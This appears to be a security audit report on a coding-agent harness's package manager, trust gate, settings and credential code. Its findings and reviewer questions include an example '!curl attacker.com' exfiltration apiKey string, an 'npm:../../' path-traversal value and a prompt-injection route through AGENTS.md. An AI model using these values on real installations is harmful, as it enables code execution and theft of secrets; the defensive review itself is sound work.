# Core: package-manager, trust, settings, auth (p–z)

## Scope (files + LOC)

`packages/coding-agent/src/core/*.ts`, alphabetically package-manager.ts through usage-totals.ts (23 top-level files; subdirectories `export-html/`, `extensions/`, `tools/`, `compaction/` are out of scope for this section). 9,880 LOC total.

| file | LOC | role |
|---|---|---|
| package-manager.ts | 2677 | npm/git/local package + extension/skill/prompt/theme resolution, install/update/remove, temp dirs |
| session-manager.ts | 1714 | JSONL session transcript read/write/fork/tree |
| settings-manager.ts | 1272 | global/project settings.json load/merge/persist, project-trust gate for project settings |
| resource-loader.ts | 1096 | orchestrates extension/skill/prompt/theme/context-file loading each session start/reload |
| skills.ts | 487 | discovers and parses `SKILL.md` files into prompt metadata |
| provider-composer.ts | 572 | composes provider/model config + auth (API key / OAuth) from base+models.json+extension layers |
| sdk.ts | 398 | `createAgentSession()` public SDK entry point, wires model runtime, tools, streaming |
| trust-manager.ts | 244 | `trust.json` store (lockfile-protected), trust-requiring-resource detection |
| prompt-templates.ts | 285 | loads `/slash` prompt template `.md` files, arg substitution |
| resolve-config-value.ts | 287 | resolves `apiKey`/header config values, including `!shell command` execution |
| remote-catalog-provider.ts | 132 | fetches dynamic model catalog overlay from `https://pi.dev` |
| system-prompt.ts | 162 | builds the system prompt, splices in AGENTS.md/CLAUDE.md content verbatim |
| project-trust.ts | 96 | resolves the "trust this folder?" decision (prompt / extension hook / CLI override) |
| provider-attribution.ts | 97 | adds per-provider attribution/session HTTP headers |
| runtime-credentials.ts | 52 | in-memory API-key override layer over the persistent credential store |
| session-cwd.ts | 59 | detects/report stale session cwd |
| usage-totals.ts | 70 | token/cost accounting (no I/O) |
| slash-commands.ts | 42 | static list of built-in `/command` metadata |
| pi-manifest.ts | 34 | reads `pi` field of a package's `package.json` |
| source-info.ts | 40 | provenance tagging for loaded resources |
| telemetry.ts | 13 | `PI_TELEMETRY` env flag check |
| timings.ts | 50 | `PI_TIMING` startup profiler |
| radius.ts | 1 | constant re-export |

## What this area can do (prose)

This is the trust-and-supply-chain core of the harness: it decides whether a project folder is trusted, loads settings/extensions/skills/prompts/themes/context-files accordingly, and — the single biggest capability in the whole slice — **automatically shells out to `npm install`/`git clone`/`git fetch`+`reset --hard`+`clean -fdx` for any package source (`npm:`/git URL) listed in trusted settings whenever the resource loader reloads, with no per-install confirmation prompt** (the only gate is the one-time "Trust this project folder?" decision, whose own copy explicitly warns "install missing project packages, and execute project extensions"). It persists three JSON config stores (`settings.json` global+project, `trust.json`) through a consistent `proper-lockfile`-protected read-modify-write pattern that matches the pattern `auth-storage.ts` uses for `auth.json` (i.e. the CVE-2026-54327 write-race class appears already mitigated consistently across this area). It resolves provider credentials (API keys, OAuth tokens, custom headers) from `models.json`/extension config, including a `!shell command` execution sink for deriving API keys from external credential helpers. It builds the system prompt, unconditionally splicing raw `AGENTS.md`/`CLAUDE.md` file content into `<project_instructions>` regardless of project trust (by contrast, `SYSTEM.md`/`APPEND_SYSTEM.md` do require trust) — the canonical, by-design-unmitigated prompt-injection surface (T1). It also persists the full session transcript (JSONL, unencrypted, default file permissions) and fetches an optional dynamic model-catalog overlay from `pi.dev` over the network.

## Capability inventory

### process-exec

| file:line | what | trigger | guard | attacker-influenced? |
|---|---|---|---|---|
| package-manager.ts (via `runCommand`/`runCommandSync`/`runCommandCapture`, e.g. 1823,1829,1892,1907,1929) | `git clone/fetch/checkout/reset --hard/clean -fdx`, `npm/pnpm/bun install/uninstall/view` — args passed as arrays via `spawnProcess`/`spawnProcessSync` (no shell) | resource-loader reload (session start, `/reload`, cwd/project-trust change), `pi package install/update` CLI | `assertProjectTrustedForScope()` for project scope; `isOfflineModeEnabled()` (`PI_OFFLINE`) short-circuits all of it | Yes — package `source` strings come from settings.json `packages` array (project scope requires prior trust; user/global scope is the user's own file) |
| resolve-config-value.ts:157,187 (`spawnSync`/`execSync`) | executes `!<command>` config values verbatim in the user's shell to resolve an API key/header value | provider auth resolution (`composeApiKeyAuth`/`resolveHeaders*`) whenever a model/provider needs credentials | none beyond the value having to originate in `models.json`/extension `apiKey`/`headers` config (a deliberate "credential helper" feature, cf. git credential helpers) | Depends on where the `!command` string comes from — see "Questions for reviewer": needs correlation with `model-config.ts` (out of scope) trust gating |
| package-manager.ts:1 (`import type ... "node:child_process"`) | type-only import | n/a | n/a | Dismissed — no runtime effect (see Dismissed section) |

### env

| file:line | what | trigger | guard | attacker-influenced? |
|---|---|---|---|---|
| package-manager.ts:6-23 `getEnv()` | on Linux, if `process.env` is empty, falls back to reading `/proc/self/environ` to reconstruct env for child processes | every git/npm subprocess spawn | only fires when `process.env` is already empty (defensive fallback for restricted runtimes) | No — reads the process's own environment, not attacker data |
| package-manager.ts:44 `isOfflineModeEnabled()` | reads `PI_OFFLINE` to disable all install/update/refresh network activity | every install/resolve call | — | Operator-controlled only |
| resolve-config-value.ts:89 | reads `process.env[name]` as fallback for `${VAR}` template substitution in api-key/header config | credential resolution | — | No (reads real env, doesn't let attacker choose which var beyond what settings.json names) |
| settings-manager.ts:864 `getExternalEditorCommand()` | `VISUAL`/`EDITOR` fallback for the Ctrl+G external editor command | interactive mode editor invocation (consumer out of scope) | project value requires trust; global value is user's own settings | Low |
| settings-manager.ts:1103,1208; telemetry.ts:10; timings.ts:6 | `PI_CLEAR_ON_SHRINK`, `PI_HARDWARE_CURSOR`, `PI_TELEMETRY`, `PI_TIMING` feature flags | startup | — | Operator-controlled only |
| trust-manager.ts:185 | `process.env.HOME` used to locate the user's `~/.agents/skills` dir (excluded from trust-requiring checks) | every trust-requirement check | — | No |

### fs-write

| file:line | what | trigger | guard | attacker-influenced? |
|---|---|---|---|---|
| package-manager.ts:217-218 `getExtensionTempFolder()` | `mkdirSync(...,{mode:0o700})` + `chmodSync(0o700)` under `agentDir/tmp/extensions` | any temporary/managed install path computation | mode explicitly hardened (defense against T3 shared-machine snooping); **not** shared `os.tmpdir()`, so not the CVE-2026-54328 predictable-shared-temp-path pattern | No |
| package-manager.ts:1819-1994 (mkdir/rm/write across install/uninstall) | creates/removes npm+git install roots, package.json/.gitignore scaffolding, git-update-in-progress marker files | package install/update/remove | project-scope gated by `assertProjectTrustedForScope()` | Package source values as above |
| session-manager.ts:486,880,1599 (`mkdirSync`, no mode) | creates session directory (`agentDir/sessions/--<encoded-cwd>--` or custom `--session-dir`) | every new session | none — default umask, **no `0o700` hardening** unlike the extension temp folder | See finding below (T3) |
| session-manager.ts:984,1021,1033,1040,1620,1625 (`writeFileSync`/`appendFileSync`, no mode) | writes/append JSONL transcript entries (full conversation incl. tool output) | every turn | none — default umask | T3: transcripts world-readable by default on typical Linux umask |
| settings-manager.ts:247,252 (`FileSettingsStorage.withLock`) | `mkdirSync`+`writeFileSync` full-file overwrite of `settings.json` | any `set*()` settings call | `proper-lockfile` cross-process lock; project writes gated by `assertProjectTrustedForWrite()` | Same lockfile pattern as `auth-storage.ts` (CVE-2026-54327 class) — no independent race found here |
| trust-manager.ts:132-133,138 | `mkdirSync`+`writeFileSync` full-file overwrite of `trust.json` | trust decision save (`/trust`, trust prompt) | `proper-lockfile`-protected (`acquireTrustLockSync`) | Same pattern, consistent |

### deserialize

| file:line | what | trigger | guard | attacker-influenced? |
|---|---|---|---|---|
| package-manager.ts:1477,1493,1859,2031 | `JSON.parse` of installed package.json / npm CLI JSON output | install/update/version-check flows | parsed into typed shape, wrapped in try/catch | Package content is whatever was installed (already gated by install trigger above) |
| pi-manifest.ts:18 | `JSON.parse` of a package's `package.json` "pi" manifest field | every package resource resolution | `isObject()` guards, try/catch | Yes, but only after the package was already installed under the trust gate |
| session-manager.ts:306,506 | `JSON.parse` per JSONL line when loading session transcripts | session resume/fork/tree | malformed lines silently skipped; header validated (`type==="session"`, `id` is string) | Session files are local/self-authored, or imported explicitly by the user (`/import`) |
| settings-manager.ts:369,591 | `JSON.parse` of `settings.json` content | settings load/reload/persist-merge | project scope gated by trust; global is the user's own file | See fs-write row above |
| trust-manager.ts:104 | `JSON.parse` of `trust.json`, then strict-value validation (`true|false|null` only) | every trust lookup | throws on malformed/invalid file | No (local-only file) |

### trust

| file:line | what | trigger | guard | attacker-influenced? |
|---|---|---|---|---|
| trust-manager.ts:184-206 `hasTrustRequiringProjectResources()` | decides whether a cwd needs a trust prompt at all (checks for `.pi/{settings.json,extensions,skills,prompts,themes,SYSTEM.md,APPEND_SYSTEM.md}` or ancestor `.agents/skills`) | every runtime creation / reload | — | Repo layout is attacker-influenced (T1): a repo can be crafted to *avoid* triggering trust by omitting these paths while still shipping e.g. `AGENTS.md` (which is never trust-gated, see finding below) |
| project-trust.ts:46-96 `resolveProjectTrusted()` | resolves trust via CLI override → extension `project_trust` hook → persisted `trust.json` decision → `defaultProjectTrust` setting → interactive prompt | session/runtime startup | UI-gated unless a default/override is configured | An already-loaded (pre-trust-bootstrap) extension can answer the `project_trust` hook and auto-set trust — see finding below |
| trust-manager.ts:208-244 `ProjectTrustStore` | per-directory trust decision store (`trust.json`), nearest-ancestor lookup, `proper-lockfile`-protected read/write | `/trust`, trust prompt, project_trust extension hook | lockfile | Persisted; a directory trusted once stays trusted even if its contents change later (residual risk, see finding) |
| package-manager.ts:1714-1718 `assertProjectTrustedForScope()` | throws if any project-scope package storage op is attempted while untrusted | every project-scope install/remove/getInstalledPath/base-dir resolution | — | Consistently applied across all project-scope path helpers in package-manager.ts except see finding below |
| settings-manager.ts:459-476,541 | `setProjectTrusted()` clears/reloads project settings on trust flip; `assertProjectTrustedForWrite()` blocks writing project settings while untrusted | trust resolution, settings writes | — | Consistent |

### network

| file:line | what | trigger | guard | attacker-influenced? |
|---|---|---|---|---|
| remote-catalog-provider.ts:45-132 `withRemoteCatalog()` | fetches `GET https://pi.dev/api/models/providers/<id>` (with `if-none-match`) to refresh a dynamic model-catalog overlay, persists ETag/body | model registry refresh, gated by an `allowNetwork` flag whose call sites live in `model-runtime.ts` (out of scope: core-a) | `context.allowNetwork`, 4h refresh interval, offline check upstream | Not attacker-controlled directly, but see "Questions for reviewer" — cross-check with core-a whether normal session start sets `allowNetwork:true` anywhere, since it would mean phoning `pi.dev` (upstream's domain, unrelated to this fork) on every/periodic session start despite the fork's "vendor the catalog, build offline" hardening hunk |
| provider-attribution.ts:36-65 | adds attribution headers (`HTTP-Referer: https://pi.dev`, `X-OpenRouter-*`, NVIDIA/Cloudflare headers) to outbound LLM requests | every provider request, gated by `isInstallTelemetryEnabled()` | opt-out via settings/`PI_TELEMETRY=0` | No secret leakage — static branding headers only |
| provider-attribution.ts:67-77 `getSessionHeaders()` | sends `x-opencode-session: <sessionId>` to OpenCode-hosted models only | requests to `opencode`/`opencode-go` provider or `opencode.ai` host | host/provider-matched | Session ID isn't secret; scoped to the matching provider only |
| settings-manager.ts:134 | `websocketConnectTimeoutMs` setting (comment only) | — | — | Dismissed — not a network call site |

### credentials

| file:line | what | trigger | guard | attacker-influenced? |
|---|---|---|---|---|
| provider-composer.ts:301-365 `composeApiKeyAuth()` | resolves the effective API key for a provider from stored credential → configured `apiKey` (literal/`${ENV}`/`!command`) → inherited base auth; also resolves and merges custom headers | every provider auth resolution (login check, request) | delegates env/command resolution to `resolve-config-value.ts` | Configured `apiKey`/`headers` values originate in `models.json`/extension `ProviderConfigInput` — cross-check trust gating with core-a |
| provider-composer.ts:258-270 `withConfiguredAuth()` | when `authHeader` is set, builds `Authorization: Bearer <apiKey>` and merges arbitrary configured headers onto the outbound request | same | `authHeader` + headers come from the same config layer | Same as above |
| provider-composer.ts:367-390 `composeOAuthAuth()`/`adaptOAuth()` | wraps an extension-supplied OAuth flow (`login`/`refreshToken`/`getApiKey`) into the canonical `OAuthAuth` shape | provider registration by an extension | extension itself is subject to project-trust/extension-loading gates (core-a/extensions scope) | Extension code, not runtime input |
| runtime-credentials.ts:4-52 `RuntimeCredentials` | in-memory (non-persistent) API-key override layered in front of the real `CredentialStore` | `setRuntimeApiKey()`/`removeRuntimeApiKey()` (e.g. `--api-key` CLI flag, consumer out of scope) | overrides never touch disk | CLI-flag/programmatic input only |
| sdk.ts:174 | `authPath = join(agentDir, "auth.json")` — wires the canonical persistent credential file location into `ModelRuntime.create()` | SDK bootstrap | actual `auth.json` read/write/locking lives in `auth-storage.ts` (out of scope: core-a) | — |

## Dismissed sweep hits (with reason)

- **`package-manager.ts:1`** (`import type { ChildProcess, ... } from "node:child_process"`) — type-only import, no runtime process-exec. Real exec sinks are the `runCommand*`/`spawn*` methods, documented above.
- **The bulk of the 64 "trust"-class hits in `trust-manager.ts`/`project-trust.ts`** (interface field declarations like `trusted: boolean`, `updates: ProjectTrustUpdate[]`, local variable names `trustPath`/`trustOptions`/`decision`) — these are identifiers containing the word "trust", not independent capability sites. They're all part of the mechanisms already captured in the `trust` inventory table above (`ProjectTrustStore`, `resolveProjectTrusted`, `getProjectTrustOptions`); listing all 64 individually would just restate the same two functions line by line.
- **`sdk.ts:70`** (`/** Optional denylist of tool names to disable... */`) — doc comment matched by the "trust" regex on an unrelated word; no trust logic on this line.
- **`slash-commands.ts:34`** (`{ name: "trust", description: "Save project trust decision..." }`) — static metadata string for the `/trust` command palette entry, not trust-enforcement code itself (the enforcement is in `project-trust.ts`/`trust-manager.ts`).
- **`settings-manager.ts:134`** (network class: `websocketConnectTimeoutMs?: number;` field with a comment mentioning "WebSocket") — a settings type declaration, not a network call site.
- **Most of the 29 "credentials"-class hits in `provider-composer.ts`** (type imports `OAuthCredentials`, interface method signatures `login(...)`, `refreshToken(...)`, `getApiKey(...)`) — type-level scaffolding for the credential-composition functions already covered in the `credentials` table; not separate runtime sinks.
- **`package-manager.ts:1` env-adjacent line at top of file** already counted under process-exec above — not double-counted here.

## Capabilities found by reading, missed by the sweep

1. **Unconditional auto-install of missing configured packages on every resource-loader reload — no `onMissing` prompt wired up in the normal runtime path.** `DefaultPackageManager.resolve()` accepts an `onMissing` callback that would let a caller prompt/skip before installing; but `resource-loader.ts` (`reload()` line 403, `loadCurrentExtensionSet()` line 549) — the only path exercised by normal session startup (`sdk.ts:183`, `agent-session-services.ts:154`) and by `pi config`/`package-manager-cli.ts` browsing (line 661/663) — never passes `onMissing`. Per `resolvePackageSources`'s `installMissing()` (package-manager.ts:1244-1255), `!onMissing` means **install immediately, unconditionally**. The only UI-confirmed path (`onMissing: async () => "skip"`) is used solely by `cli/startup-ui.ts:73`, an out-of-scope caller. Net effect: once a project folder is trusted (a one-time decision), every `npm:`/git package source subsequently added to that trusted project's `.pi/settings.json` — or to the user's own global `settings.json` — is silently installed (running that package's npm `postinstall`/`prepare` scripts, or `git clone`) on the very next reload, with zero additional confirmation. The trust prompt's own text does disclose this ("install missing project packages, and execute project extensions"), so this is a documented design choice, not a hidden bug — but it means **the practical security boundary is "was this folder ever trusted," not "was this specific package approved."** A later, unreviewed edit to an already-trusted repo's `.pi/settings.json` (e.g. a malicious PR merged into a repo the user trusted months ago) achieves code execution on the next `pi`/`strape` session with no further prompt. This is a direct sibling of CVE-2026-54325 ("extension loading without user approval") at the settings/package layer rather than the extension-file layer.
2. **`getManagedNpmInstallPath()` (package-manager.ts:2039-2048) resolves npm package names via a raw `path.join()`, with no `resolveManagedPath()` escape check** — unlike every git-sourced path in the same file (`getGitInstallPath` at 2067-2076, `getTemporaryDir` at 2089-2096), which explicitly route through `resolveManagedPath()` and throw `"Refusing to use path outside package install root"` if the joined path escapes the intended root. An `npm:` source string like `npm:../../../../some/dir` survives `parseNpmSpec()` unsanitized (the regex only splits off an optional `@version`) and reaches `join(agentDir_or_cwd/.pi, "npm", "node_modules", source.name)`, which `path.join` will happily walk upward past the install root. If the escaped path exists and its `package.json` satisfies the (often absent) version constraint, `collectPackageResources()` will scan that arbitrary directory's `extensions/`, `skills/`, `prompts/`, `themes/` subfolders and load whatever it finds — including `.ts`/`.js` files that get executed as extensions. Exploitability is bounded by the fact that reaching this code already requires the ability to add an entry to a trusted project's or the user's own `settings.json` `packages` array (which, per finding 1, already grants arbitrary git/npm code execution by more direct means, and settings.json already supports fully-arbitrary local `extensions`/`skills` path entries by design) — so this is a **defense-in-depth / consistency gap** worth fixing to match the git-path handling, not a standalone privilege escalation.
3. **`getExtensionTempFolder()`/`getTemporaryDir()` (package-manager.ts:215-220, 2089-2105) are temp-path logic the sweep's `temp-paths` regex did not flag at all** (0 hits in this file), presumably because they don't call `os.tmpdir()`/`mkdtemp` literally. Worth recording because this is exactly the code that matters for CVE-2026-54328 variant-hunting: it's actually **well hardened** — temp/managed install dirs live under the user's own `agentDir` (not a world-writable shared `/tmp`), the top-level `tmp/extensions` folder is created with `mode:0o700` and `chmodSync`'d again defensively, and every derived subpath is validated via `resolveManagedPath()` (except the npm-name gap in finding 2).
4. **Session transcript files and the session directory get no permission hardening** (session-manager.ts:486,880,1599,984,1021,1033,1040,1620,1625 — plain `mkdirSync`/`writeFileSync`/`appendFileSync` with no `mode`), in contrast to the extension temp folder's explicit `0o700`. On a shared multi-user Linux box with a permissive umask (e.g. `022`), full conversation transcripts (which can include pasted secrets, file contents, tool output) land in `~/.pi/agent/sessions/**/*.jsonl` world-readable by default. This is a T3 (local unprivileged attacker) concern parallel in spirit to the temp-path CVE class, just applied to long-lived session data instead of install paths.
5. **`AGENTS.md`/`CLAUDE.md` context files are loaded and spliced into the system prompt (`system-prompt.ts:144-152`, sourced via `resource-loader.ts`'s `loadProjectContextFiles()`) with no project-trust check at all**, while the sibling files `SYSTEM.md`/`APPEND_SYSTEM.md` explicitly call `settingsManager.isProjectTrusted()` before reading (`resource-loader.ts:1022-1048`). This asymmetry is consistent with the stated threat model ("prompt injection is unmitigated by design"), but it means a repository can plant `AGENTS.md` content that always reaches the system prompt even for a project the user has explicitly *not* trusted, whereas the same content in `SYSTEM.md` would be blocked. Worth confirming this asymmetry is intentional rather than an oversight.
6. **A pre-trust-bootstrap extension can answer its own trust question.** `resource-loader.ts`'s `loadProjectTrustExtensions()` loads user/global + CLI-supplied extensions *before* the project-trust decision is made (with project settings forced untrusted), then `project-trust.ts:54-70` lets any of those already-loaded extensions handle a `project_trust` event and directly return `trusted: "yes"`/`"no"` (optionally with `remember: true`, persisting the decision to `trust.json`). This is intentional (it's how an org could ship a policy extension that auto-trusts known-good repos), but it does mean the trust prompt can be silently bypassed by a user-installed (already-trusted-by-definition, since it's global-scope) extension — worth the human reviewer confirming this hook can't be reached by anything project-scoped/untrusted.
7. **`resolve-config-value.ts`'s `!command` shell-exec sink for API keys/headers is a legitimate credential-helper feature, but its blast radius depends entirely on where `models.json`/extension provider config is allowed to come from** — that gating lives in `model-config.ts`/`model-registry.ts` (core-a scope, not read for this report). Flagged as a cross-boundary dependency to verify.

## Questions for the human reviewer

1. Confirm with the core-a reviewer whether `model-config.ts` gates **project-scoped** `models.json` behind `isProjectTrusted()` the same way `settings.json`/`skills`/`extensions` are gated. If project-scoped `models.json` can be read while untrusted, an untrusted repo could supply a `!curl attacker.com/$(...)`-style `apiKey` string that gets shell-executed via `resolve-config-value.ts` the moment any model lookup touches that provider.
2. Confirm whether any normal (non-`--offline`, non-explicit-refresh) session-start path in `model-runtime.ts` (core-a) ever calls `refresh({ allowNetwork: true })`, which would make `remote-catalog-provider.ts` phone `https://pi.dev` periodically even in this hardened, offline-vendored fork. The one confirmed session-start call (`agent-session-services.ts:182`) passes `allowNetwork: false`, but that file wasn't read in depth (it's core-a scope, `a`-prefixed).
3. Is the residual risk in finding 1 above (trust is a one-time, persisted, per-directory decision; the actual `packages` list is never re-confirmed) considered acceptable given the trust-prompt's disclosure text, or is there a should-fix here (e.g. re-prompt when the `packages` array changes since the last trusted session)?
4. Should `getManagedNpmInstallPath()` route through `resolveManagedPath()` like every other derived install path in `package-manager.ts` does (finding 2), purely for consistency/defense-in-depth?
5. Is the missing `0o600`/`0o700` hardening on session transcript files (finding 4) intentional (e.g. relying on `~/.pi/agent` itself being `0700`, which wasn't verified here since `config.ts` is out of scope) or an oversight?
